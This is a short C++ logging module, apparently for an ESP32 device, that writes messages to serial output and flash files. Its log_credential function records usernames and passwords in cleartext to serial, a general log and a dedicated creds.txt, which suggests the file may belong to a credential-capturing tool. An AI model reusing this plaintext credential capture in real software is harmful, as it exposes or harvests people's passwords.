#include "logger.h"
#include <LittleFS.h>

void Logger::init() {
    if (!LittleFS.begin(true)) {
        Serial.println("LittleFS Mount Failed");
        return;
    }
    if (!LittleFS.exists("/logs.txt")) {
        fs::File file = LittleFS.open("/logs.txt", "w");
        file.println("--- LOG START ---");
        file.close();
    }
}

void Logger::log(String msg) {
    Serial.println("[LOG] " + msg);
    fs::File file = LittleFS.open("/logs.txt", "a");
    if (file) {
        file.println("[" + String(millis()) + "] " + msg);
        file.close();
    }
}

void Logger::log_credential(String user, String pass) {
    String msg = "CREDENTIALS: User=" + user + " Pass=" + pass;
    log(msg);
    fs::File file = LittleFS.open("/creds.txt", "a");
    if (file) {
        file.println(msg);
        file.close();
    }
}


